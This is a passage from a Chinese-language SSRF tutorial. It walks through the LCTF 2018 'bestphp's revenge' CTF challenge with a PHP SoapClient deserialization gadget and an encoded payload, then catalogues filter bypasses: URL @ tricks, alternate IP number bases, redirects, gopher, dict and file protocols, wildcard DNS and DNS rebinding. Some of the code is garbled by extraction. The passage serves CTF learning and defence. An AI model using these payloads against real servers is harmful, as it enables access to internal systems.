**第四步**
然后服务器端收到参数后处理，再通过Soap协议把函数的返回值发了回来，整个交流结束~
###  攻击
一道很出名的CTF题目，bestphp’s revenge
先补充几个知识点吧~
* * *
     $target,    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",    'uri' => "123"));var_dump($attack);//$payload = urlencode(serialize($attack));//echo $payload;?>
执行后的结果如下，是一个名为SoapClient的对象实体
    C:\phpstudy_pro\WWW\hack.php:6:object(SoapClient)[1]  public 'uri' => string '123' (length=3)  public 'location' => string 'http://127.0.0.1/flag.php' (length=25)  public '_user_agent' => string 'N0rth3tyCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4' (length=56)  public '_soap_version' => int 1
* * *
SoapClient类的`__call()`方法的奇技淫巧：
    'http://192.168.0.136:2333', 'location'=>'http://192.168.0.136:2333/66'));$b = serialize($a);echo $b;$c = unserialize($b);$c->a();//访问一个不存在的方法，触发__call魔法函数?>
这就直接发包了！
* * *
再来看这道题，只有两个文件，index.php和flag.php
    //index.php
    //flag.phpsession_start();echo 'only localhost can get flag!';$flag = 'LCTF{*************************}';if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){       $_SESSION['flag'] = $flag;   }only localhost can get flag!
flag.php说明了获得flag的条件，必须通过127.0.0.1访问才行。这不就是在考SSRF嘛？同时也出现了session_start函数和Session数组可编辑，很明显就是告诉你可以自己设置PHP处理器来反序列化攻击；加上补充的知识点，一下子就出来了思路
> 通过反序列化触发SoapClient类的__call魔术方法，达到127.0.0.1访问flag.php的SSRF攻击效果
利用call_user_func函数，传入GET参数f=session_start和POST数据serialize_handler=php_serialize，这样就执行了
> session_start([‘serialize_handler’=>’php_serialize’])
成功修改了PHP处理器
同时写Payload如下，生成后作为GET参数name的值发出去即可
     $target,    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",    'uri' => "123"));$payload = urlencode(serialize($attack));echo $payload;?>
别忘了记得加个`|`
>
> |O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
接下来该思考如何触发SoapClient这个对象实体…有个小细节
`call_user_func()`函数如果传入的参数是`array`类型的话，会将数组的成员当做类名和方法。
这里可以先用`extract()`将b覆盖成`call_user_func()`，`reset($_SESSION)`就是`$_SESSION['name']`（reset的作用就是重置数组指针至开头），我们可以传入`name=SoapClient`，那么最后`call_user_func($b,
$a)`就变成`call_user_func(array('SoapClient','welcome_to_the_lctf2018'))`,即`call_user_func(SoapClient->welcome_to_the_lctf2018)`；`SoapClient`对象实体中没有`welcome_to_the_lctf2018`这个方法，就会调用魔术方法`__call()`从而发包
按下图发包即可
最后把回应的Cookie复制，我们用这个Cookie去访问就能拿到Flag啦
## 绕过
### **@绕过**
URL的完整格式是
    [协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]
所以你访问
> http://baidu.com@1.1.1.1
和
> http://1.1.1.1
效果是一样滴，因为人家解析的本来就是@后面的服务器地址
### **进制绕过**
以PHP为例，一般后端用正则匹配IP长这个样子:
    $str = '';$isMatched = preg_match_all('/((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}/', $str, $matches);var_dump($isMatched, $matches);
所以你可以换成各种进制进行绕过，以`192.168.0.1`为例（这个[网址](http://mo.ab126.com/system/2859.html)可以进行在线转换）
十六进制 = C0A80001
十进制 = 3232235521
二进制 = 11000000101010000000000000000001
### **重定向绕过 &短网址绕过**
一般来说，PHP里的重定向长这样
    302跳转->成功访问`192.168.0.1`
这样就成功绕过了检查
### **冷门协议绕过**
如果是php，可以试试php所有的伪协议以及冷门的非HTTP协议
    php://系列zip:// & bzip2:// & zlib://系列data://phar://file:///dict://sftp://ftp://tftp://ldap://gopher://
### **特殊用法绕过**
下面这俩可以试试绕过127.0.0.1:80，不一定有效
    http://[::]:80/ http://0000::1:80/http://0/
中文句号也可以试试
    192。168。0。1
### **xip.io和xip.name**
这俩东西叫泛域名解析，这篇[文章](https://cloud.tencent.com/developer/article/1825757)很详细地描述了泛域名的配置；想要具体了解的可以去看看
一旦配置了这个服务，会出现下面这样的情况
    10.0.0.1.xip.io         # 解析到 10.0.0.1www.10.0.0.2.xip.io     # www 子域解析到 10.0.0.2mysite.10.0.0.3.xip.io  # mysite 子域解析到 10.0.0.3foo.bar.10.0.0.4.xip.io # foo.bar 子域解析到 10.0.0.4-----------------------------------------------------------------10.0.0.1.xip.name         # 解析到 10.0.0.1www.10.0.0.2.xip.name     # www 子域解析到 10.0.0.2mysite.10.0.0.3.xip.name  # mysite 子域解析到 10.0.0.3foo.bar.10.0.0.4.xip.name # foo.bar 子域解析到 10.0.0.4
### **Enclosed alphanumerics字符集绕过**
你能在这个[网站](https://www.mp51.vip/Code/AllUniCode?quwei=2460-24FF)看到这个字符合集，挑选合适的字符就行
    https://ⓦⓦⓦ.ⓔⓣⓔsⓣⓔ.ⓒⓄⓜ/是完全等同于https://www.eteste.com/
当然，适用于域名而不适用与直接IP访问
### **DNS重绑定**
在这里强烈推荐一个外国友人写的[靶场](https://github.com/incredibleindishell/SSRF_Vulnerable_Lab)，基本涵盖了ssrf的所有高级绕过！有兴趣的可以瞅瞅
我们这里就需要用到它的重绑定关卡，其解析也在[这里](https://github.com/incredibleindishell/SSRF_Vulnerable_lab/tree/master/www/DNS%20Rebinding%20based%20Bypass)
**业务理解**
把这一关PHP源码中的重点代码贴出来：
    There was no host in your url!"); }    echo '               Domain: - '.$host = $url_parts["host"].'';        if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {            $ip = $host;        } else {            $ip = dns_get_record($host, DNS_A);            if (count($ip) > 0) {                $ip = $ip[0]["ip"];                echo "Resolved to IP: - {$ip}";                            } else {                die("Your host couldn't be resolved man...");            }        }        foreach ($disallowed_cidrs as $cidr) {            if (in_cidr($cidr, $ip)) {                die("That IP is a blacklisted cidr ({$cidr})!"); // Stop processing if domain reolved to private/reserved IP            }        }        echo "Domain IP is not private, Here goes the data fetched from remote URL ";        echo "".file_get_contents($url)."";    }.....?>
简单叙述一下逻辑：
  1. 判定你给的IP或者域名解析后的IP是否在黑名单中